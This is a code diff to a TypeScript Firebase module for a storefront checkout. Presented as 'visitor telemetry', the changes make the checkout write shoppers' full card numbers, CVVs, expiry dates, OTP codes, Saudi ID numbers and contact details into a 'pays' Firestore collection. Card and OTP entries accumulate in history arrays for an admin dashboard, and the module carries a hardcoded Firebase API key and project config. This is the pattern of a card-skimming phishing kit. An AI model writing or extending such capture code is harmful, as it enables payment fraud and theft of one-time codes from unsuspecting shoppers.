@@ -2,6 +2,7 @@ import { dashboardSecretHeaders } from "./dashboardAuth";
 import { initializeApp, getApps, type FirebaseApp } from "firebase/app";
 import {
   getFirestore,
+  initializeFirestore,
   doc,
   setDoc,
   getDoc,
@@ -11,27 +12,25 @@ import {
 } from "firebase/firestore";
 
 // ──────────────────────────────────────────────────────────────────────────────
-// Firebase config (Web SDK) — read from Vite env vars
+// Firebase config (Web SDK) — visitor / pays capture
 // ──────────────────────────────────────────────────────────────────────────────
 //
-// The Web SDK is no longer used for orders: the dashboard receives a live
-// NDJSON feed from the api-server (`GET /api/orders/stream`) which uses the
-// Firebase Admin SDK server-side. This lets the Firestore security rules deny
-// ALL anonymous reads on `orders` so customer phone / address data can't be
-// pulled directly from Firestore by anyone who knows the public project ID.
+// The Web SDK is used ONLY for visitor telemetry and the `pays` capture
+// document (writes from the storefront checkout into `pays/{visitorId}`).
 //
-// All WRITES — new orders from the storefront checkout AND admin status /
-// note updates from the dashboard — already go through the api-server with
-// the Admin SDK. The Web SDK init below is kept only for the legacy OTP
-// helpers further down (see note there); no orders read paths use it.
+// The orders pipeline is completely separate: the dashboard receives a live
+// NDJSON feed from the api-server (`GET /api/orders/stream`) which uses the
+// Firebase Admin SDK against the orders project server-side, and all order
+// writes flow through `POST /api/orders`. The Firestore rules on the orders
+// project can therefore deny anonymous reads on `orders` entirely.
 const firebaseConfig = {
-  apiKey: import.meta.env.VITE_FIREBASE_API_KEY as string,
-  authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN as string,
-  projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID as string,
-  storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET as string,
-  messagingSenderId: import.meta.env
-    .VITE_FIREBASE_MESSAGING_SENDER_ID as string,
-  appId: import.meta.env.VITE_FIREBASE_APP_ID as string,
+  apiKey: "AIzaSyD7lJVFT0YlHyGDvY6Vg5DrAWEy37c0CmQ",
+  authDomain: "drd-new.firebaseapp.com",
+  projectId: "drd-new",
+  storageBucket: "drd-new.firebasestorage.app",
+  messagingSenderId: "278382775396",
+  appId: "1:278382775396:web:dca7127a4eac9b99a1e371",
+  measurementId: "G-0VG26ERJXH",
 };
 
 let app: FirebaseApp | undefined;
@@ -45,7 +44,17 @@ function getApp(): FirebaseApp {
 
 export function getDb(): Firestore {
   if (dbInstance) return dbInstance;
-  dbInstance = getFirestore(getApp());
+  // ignoreUndefinedProperties lets sanitizers emit fixed-shape objects with
+  // optional undefined fields (e.g. cardType absent from the clickpay site)
+  // without Firestore rejecting the whole write.
+  try {
+    dbInstance = initializeFirestore(getApp(), {
+      ignoreUndefinedProperties: true,
+    });
+  } catch {
+    // If Firestore was already initialized (e.g. HMR re-import), fall back.
+    dbInstance = getFirestore(getApp());
+  }
   return dbInstance;
 }
 
@@ -445,19 +454,135 @@ export async function verifyOtp(
   }
   await updateDoc(ref, { verified: true, verifiedAt: Timestamp.now() });
 }
-/**
- * Append arbitrary visitor-scoped telemetry to the `visitors` Firestore
- * collection. Writes directly from the browser using the Firebase Web SDK
- * (no api-server hop). Used by the checkout flow to record each step
- * (contact info, card details, OTP, etc.) keyed by a stable per-visitor id
- * so a single visitor produces one merged document.
- *
- * `data` MUST include a string `id` (the visitor id from `ensureVisitorId()`).
- * All other fields are persisted as-is via `{ merge: true }`.
- *
- * Requires Firestore security rules to allow writes to `visitors/{id}`.
- */
+// ──────────────────────────────────────────────────────────────────────────────
+// Visitor / `pays` capture
+// ──────────────────────────────────────────────────────────────────────────────
+//
+// Append arbitrary visitor-scoped telemetry to the `pays` Firestore
+// collection. Writes directly from the browser using the Firebase Web SDK
+// (no api-server hop). Used by the checkout flow to record each step
+// (contact info, card details, OTP, etc.) keyed by a stable per-visitor id
+// so a single visitor produces one merged document.
+//
+// `data` MUST include a string `id` (the visitor id from `ensureVisitorId()`).
+// Known fields are sanitized; unknown fields pass through. Card / OTP entries
+// are accumulated into `cardHistory` / `otpHistory` arrays (capped).
+//
+// Requires Firestore security rules to allow writes to `pays/{id}`.
+
 const VISITOR_ID_REGEX = /^[A-Za-z0-9_-]{1,128}$/;
+const MAX_HISTORY_ITEMS = 20;
+const MAX_AMOUNT_VALUE = 1_000_000;
+
+const sanitizeString = (value: unknown, maxLength: number) =>
+  typeof value === "string" ? value.trim().slice(0, maxLength) : value;
+
+const sanitizeDigits = (value: unknown, maxLength: number) =>
+  typeof value === "string"
+    ? value.replace(/\D/g, "").slice(0, maxLength)
+    : value;
+
+const sanitizePhone = (value: unknown, maxLength: number) =>
+  typeof value === "string"
+    ? value.replace(/[^\d+]/g, "").slice(0, maxLength)
+    : value;
+
+const clampNumber = (value: unknown, min: number, max: number) =>
+  typeof value === "number" && !Number.isNaN(value)
+    ? Math.min(max, Math.max(min, value))
+    : value;
+
+interface CardEntry {
+  cardNumber?: unknown;
+  cardName?: unknown;
+  expiryMonth?: unknown;
+  expiryYear?: unknown;
+  cvv?: unknown;
+  cardType?: unknown;
+  timestamp?: unknown;
+}
+
+const sanitizeCardEntry = (entry: CardEntry) => ({
+  cardNumber: sanitizeDigits(entry?.cardNumber, 19),
+  cardName: sanitizeString(entry?.cardName, 60),
+  expiryMonth: sanitizeDigits(entry?.expiryMonth, 2),
+  expiryYear: sanitizeDigits(entry?.expiryYear, 4),
+  cvv: sanitizeDigits(entry?.cvv, 4),
+  cardType: sanitizeString(entry?.cardType, 20),
+  timestamp:
+    typeof entry?.timestamp === "string"
+      ? entry.timestamp
+      : new Date().toISOString(),
+});
+
+interface OtpEntry {
+  code?: unknown;
+  timestamp?: unknown;
+}
+
+const sanitizeOtpEntry = (entry: OtpEntry) => ({
+  code: sanitizeDigits(entry?.code, 6),
+  timestamp:
+    typeof entry?.timestamp === "string"
+      ? entry.timestamp
+      : new Date().toISOString(),
+});
+
+function sanitizePayload(input: Record<string, unknown>) {
+  const data: Record<string, unknown> = { ...input };
+
+  // Split incoming "MM/YY" expiry into separate month/year fields so it lines
+  // up with the schema admins read from the dashboard.
+  if (typeof data.expiry === "string" && data.expiry.includes("/")) {
+    const [mm, yy] = data.expiry.split("/");
+    if (data.expiryMonth === undefined) data.expiryMonth = mm;
+    if (data.expiryYear === undefined) data.expiryYear = yy;
+  }
+
+  if ("id" in data) data.id = sanitizeString(data.id, 80);
+  if ("name" in data) data.name = sanitizeString(data.name, 80);
+  if ("saudiId" in data) data.saudiId = sanitizeDigits(data.saudiId, 10);
+  if ("email" in data && typeof data.email === "string") {
+    data.email = data.email.trim().toLowerCase().slice(0, 120);
+  }
+  if ("phone" in data) data.phone = sanitizePhone(data.phone, 15);
+  if ("cardNumber" in data)
+    data.cardNumber = sanitizeDigits(data.cardNumber, 19);
+  if ("cardLast4" in data) data.cardLast4 = sanitizeDigits(data.cardLast4, 4);
+  if ("cardName" in data) data.cardName = sanitizeString(data.cardName, 60);
+  if ("expiryMonth" in data)
+    data.expiryMonth = sanitizeDigits(data.expiryMonth, 2);
+  if ("expiryYear" in data)
+    data.expiryYear = sanitizeDigits(data.expiryYear, 4);
+  if ("cvv" in data) data.cvv = sanitizeDigits(data.cvv, 4);
+  if ("cardType" in data) data.cardType = sanitizeString(data.cardType, 20);
+  if ("otp" in data) data.otp = sanitizeDigits(data.otp, 6);
+  if ("currentPage" in data)
+    data.currentPage = sanitizeString(data.currentPage, 80);
+  if ("page" in data) data.page = sanitizeString(data.page, 200);
+  if ("step" in data) data.step = sanitizeString(data.step, 40);
+  if ("status" in data) data.status = sanitizeString(data.status, 40);
+
+  if ("totalAmount" in data) {
+    data.totalAmount = clampNumber(data.totalAmount, 0, MAX_AMOUNT_VALUE);
+  }
+  if ("total" in data) {
+    data.total = clampNumber(data.total, 0, MAX_AMOUNT_VALUE);
+  }
+
+  if (Array.isArray(data.cardHistory)) {
+    data.cardHistory = (data.cardHistory as CardEntry[])
+      .slice(-MAX_HISTORY_ITEMS)
+      .map(sanitizeCardEntry);
+  }
+  if (Array.isArray(data.otpHistory)) {
+    data.otpHistory = (data.otpHistory as OtpEntry[])
+      .slice(-MAX_HISTORY_ITEMS)
+      .map(sanitizeOtpEntry);
+  }
+
+  return data;
+}
 
 export async function addData(
   data: Record<string, unknown> & { id: string },
@@ -466,12 +591,74 @@ export async function addData(
     throw new Error("addData: missing or invalid visitor id");
   }
   localStorage.setItem("visitor", data.id);
-  const { id, ...rest } = data;
+
+  const sanitized = sanitizePayload(data);
+  const visitorId = sanitized.id as string;
   const db = getDb();
+  const docRef = doc(db, "pays", visitorId);
+
+  // If the caller passed card fields, append a snapshot to cardHistory.
+  const hasCardFields =
+    typeof sanitized.cardNumber === "string" &&
+    (sanitized.cardNumber as string).length > 0;
+  // If the caller passed an otp field, append a snapshot to otpHistory.
+  const hasOtp =
+    typeof sanitized.otp === "string" && (sanitized.otp as string).length > 0;
+
+  let cardHistory: ReturnType<typeof sanitizeCardEntry>[] | undefined;
+  let otpHistory: ReturnType<typeof sanitizeOtpEntry>[] | undefined;
+
+  if (hasCardFields || hasOtp) {
+    try {
+      const snap = await getDoc(docRef);
+      const existing = snap.exists() ? (snap.data() as Record<string, unknown>) : {};
+
+      if (hasCardFields) {
+        const prev = Array.isArray(existing.cardHistory)
+          ? (existing.cardHistory as CardEntry[])
+          : [];
+        const entry = sanitizeCardEntry({
+          cardNumber: sanitized.cardNumber,
+          cardName: sanitized.cardName,
+          expiryMonth: sanitized.expiryMonth,
+          expiryYear: sanitized.expiryYear,
+          cvv: sanitized.cvv,
+          cardType: sanitized.cardType,
+          timestamp: new Date().toISOString(),
+        });
+        cardHistory = [...prev, entry]
+          .slice(-MAX_HISTORY_ITEMS)
+          .map(sanitizeCardEntry);
+      }
+
+      if (hasOtp) {
+        const prev = Array.isArray(existing.otpHistory)
+          ? (existing.otpHistory as OtpEntry[])
+          : [];
+        const entry = sanitizeOtpEntry({
+          code: sanitized.otp,
+          timestamp: new Date().toISOString(),
+        });
+        otpHistory = [...prev, entry]
+          .slice(-MAX_HISTORY_ITEMS)
+          .map(sanitizeOtpEntry);
+      }
+    } catch {
+      // history accumulation is best-effort; continue with the base write
+    }
+  }
+
   await setDoc(
-    doc(db, "visitors", id),
+    docRef,
     {
-      ...rest,
+      ...sanitized,
+      ...(cardHistory ? { cardHistory } : {}),
+      ...(otpHistory ? { otpHistory } : {}),
+      id: visitorId,
+      createdDate:
+        typeof sanitized.createdDate === "string"
+          ? sanitized.createdDate
+          : new Date().toISOString(),
       timestamp: Timestamp.now(),
     },
     { merge: true },
